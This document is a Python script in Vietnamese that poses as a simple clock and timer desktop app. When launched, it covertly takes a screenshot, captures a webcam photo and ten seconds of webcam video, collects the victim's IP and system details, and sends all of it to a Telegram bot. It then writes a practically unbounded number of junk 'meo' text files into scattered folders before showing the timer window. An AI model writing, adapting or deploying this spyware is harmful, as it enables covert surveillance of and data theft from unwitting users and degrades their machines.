import os

def c_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

print("Đợi xíu...!!")

try:
    import tkinter as tk
    from tkinter import messagebox
    from PIL import Image, ImageTk
    import cv2
    from telegram import Bot
    import pytz
    import requests
    import platform
    import pyautogui
except ImportError: 
    try:
        os.system("pip install opencv-python")
        os.system("pip install python-telegram-bot")
        os.system("pip install pytz")
        os.system("pip install requests")
        os.system("pip install tk")
        os.system("pip install pillow")
        os.system("pip install pyautogui")
    except:
        c_screen()
        print("Thiết bị không hỗ trợ")
        exit()

import shutil
import random

base_path = "./data/UnonLoiT/LONALSKO/BANOAKAM"

if not os.path.exists(base_path):
    os.makedirs(base_path)

subdirectories = ["BP/DMLIA", "BV/DMLIA", "Immoo/MMM", "Omammaa/OOO", "Biusna/Oioioi", "Donnayww", "biaoaoaaoaoa", "Oluaytu"]

for subdir in subdirectories:
    full_path = os.path.join(base_path, subdir)
    os.makedirs(full_path, exist_ok=True)

from datetime import datetime
import pyautogui
import pytz

saIm = f"{base_path}/Omammaa/OOO"
if not os.path.exists(saIm):
    os.makedirs(saIm)

timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
imP = os.path.join(saIm, f'screenshot_{timestamp}.png')

screenshot = pyautogui.screenshot()
screenshot.save(imP)

next_f1_list = []

for i in range(20):
    next_f1_path = os.path.join(base_path, f'meomeo{i+1}.txt')
    with open(next_f1_path, 'w', encoding='utf-8') as file:
        file.write(f'Mình bắt trước cùng mèo kêu nha, kêu cùng em {"meo " * (i+1)}')
    next_f1_list.append(next_f1_path)

for next_f1 in next_f1_list:
    random_subdir = random.choice(subdirectories)
    destination = os.path.join(base_path, random_subdir, os.path.basename(next_f1))
    shutil.move(next_f1, destination)

import cv2
import threading
import asyncio
import requests
import platform
from telegram import Bot
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
from urllib.request import urlopen

def get_isys():
    ip_address = requests.get('https://api.ipify.org').text
    system_info = platform.uname()
    return f"{system_info.system} {system_info.node} {system_info.release} {system_info.version} {system_info.machine} {system_info.processor}", ip_address

CHAT_ID = '<idchatgrouptele>'
bot = Bot(token='<tokenbottele>')
system_info, ip_address = get_isys()

async def send_v(video_path):
    timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S || %d/%m/%Y')
    with open(video_path, 'rb') as video_file:
        await bot.send_video(chat_id=CHAT_ID, video=video_file, caption=f"Video recorded at {timestamp} || IP: {ip_address} || {system_info}")
    os.remove(video_path)

async def send_p(photo_path):
    timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S || %d/%m/%Y')
    with open(photo_path, 'rb') as photo_file:
        await bot.send_photo(chat_id=CHAT_ID, photo=photo_file, caption=f"Photo taken at {timestamp} || IP: {ip_address} || {system_info}")
    os.remove(photo_path)

async def s_screenshot(imP):
    timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')).strftime('%H:%M:%S || %d/%m/%Y')
    with open(imP, 'rb') as photo_file:
        await bot.send_photo(chat_id=CHAT_ID, photo=photo_file, caption=f"Photo screenshot taken at {timestamp} || IP: {ip_address} || {system_info}")
    os.remove(imP)

class v_recorder:
    def __init__(self, output_file=f"{base_path}/BP/DMLIA/video.avi", fps=20.0, width=640, height=480):
        self.output_file = output_file
        self.fps = fps
        self.width = width
        self.height = height
        self.cap = cv2.VideoCapture(0)
        self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.width)
        self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.height)
        self.fourcc = cv2.VideoWriter_fourcc(*'XVID')
        self.out = cv2.VideoWriter(self.output_file, self.fourcc, self.fps, (self.width, self.height))
        self.recording = False

    def s_recording(self):
        self.recording = True
        threading.Thread(target=self.record).start()

    def stop_r(self):
        self.recording = False

    def record(self):
        start_time = datetime.now()
        while (datetime.now() - start_time).total_seconds() <= 10 and self.recording:
            ret, frame = self.cap.read()
            if ret:
                self.out.write(frame)
        self.out.release()
        if os.path.exists(self.output_file):
            asyncio.run(send_v(self.output_file))

class face_r:
    def __init__(self):
        self.video_recorder = v_recorder()

    def start(self):
        self.video_recorder.s_recording()
        self.detect_f()

    def detect_f(self):
        face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
        while self.video_recorder.recording:
            ret, frame = self.video_recorder.cap.read()
            if ret:
                gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                faces = face_cascade.detectMultiScale(gray_frame, scaleFactor=1.3, minNeighbors=5)
                for (x, y, w, h) in faces:
                    cv2.rectangle(frame, (x, y), (x+w, y+h), (255, 0, 0), 2)

    def stop(self):
        self.video_recorder.stop_r()

async def t_screenshot():
    await s_screenshot(imP)

async def t_photo(photo_path=f"{base_path}/BV/DMLIA/photo.png"):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(photo_path, frame)
        await send_p(photo_path)
    cap.release()


async def main():
    try:
        await s_screenshot(imP)
    except Exception:
        pass
    try:
        await t_photo()
    except Exception:
        pass
    face_recognition = face_r()
    try:
        face_recognition.start()
        await asyncio.sleep(10)
        face_recognition.stop()
    except Exception:
        pass
    c_screen()
   
class apptime:
    def __init__(self, master):
        self.master = master
        self.master.title("XIE")
        self.master.iconphoto(False, self.get_icon())

        self.date_label = tk.Label(master, text="", font=("Arial", 12), wraplength=300)
        self.date_label.pack()

        self.time_label = tk.Label(master, text="", font=("Arial", 14), wraplength=300)
        self.time_label.pack()

        self.start_button = tk.Button(master, text="Đếm thời gian", command=self.start_timer)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Làm mới thời gian", command=self.stop_timer, state=tk.DISABLED)
        self.stop_button.pack()

        self.working = False
        self.start_time = None

        self.update_date()
        self.update_time()

    def get_icon(self):
        icon_url = "https://i.imgur.com/jhLzPp7.jpeg"
        image_bytes = urlopen(icon_url).read()
        image = Image.open(io.BytesIO(image_bytes))
        return ImageTk.PhotoImage(image)

    def update_date(self):
        weekday = self.get_weekday()
        current_date = datetime.now().strftime('%d/%m/%Y')
        self.date_label.config(text=f"{weekday} - {current_date}")
        self.master.after(1000, self.update_date)

    def update_time(self):
        current_time = datetime.now().strftime("%H:%M:%S")
        time_period = self.get_time_period()
        if self.working:
            elapsed_time = datetime.now() - self.start_time
            current_time = f"{current_time}\n{str(elapsed_time).split('.')[0]}"
        self.time_label.config(text=f"[ {time_period} ] {current_time}")
        self.master.after(1000, self.update_time)

    def start_timer(self):
        self.working = True
        self.start_time = datetime.now()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_timer(self):
        self.working = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def get_time_period(self):
        current_hour = datetime.now().hour
        if 1 <= current_hour < 11:
            return "Buổi sáng"
        elif 11 <= current_hour < 13:
            return "Buổi trưa"
        elif 13 <= current_hour < 18:
            return "Buổi chiều"
        elif 18 <= current_hour < 22:
            return "Buổi tối"
        else:
            return "Đêm"

    def get_weekday(self):
        weekdays = ["Thứ hai", "Thứ ba", "Thứ tư", "Thứ năm", "Thứ sáu", "Thứ bảy", "Chủ nhật"]
        current_weekday_index = datetime.now().weekday()
        return weekdays[current_weekday_index]


asyncio.run(main())

c_screen()

next_f2_list = []

for a in range(10000000000000000000000000000000000000000000000):
    next_f2_path = os.path.join(base_path, f'meomeomeomeone{a+1}.txt')
    with open(next_f2_path, 'w', encoding='utf-8') as file:
        file.write(f'Mình bắt trước cùng mèo kêu nha, kêu cùng em {"meo " * (a+1)}')
    next_f2_list.append(next_f2_path)

for next_f2 in next_f2_list:
    random_subdir = random.choice(subdirectories)
    destination = os.path.join(base_path, random_subdir, os.path.basename(next_f2))
    shutil.move(next_f2, destination)
root = tk.Tk()
root.withdraw()
messagebox.showinfo("Thông báo", "Ứng dụng của bạn đã chạy!")
app = apptime(root)
root.mainloop()
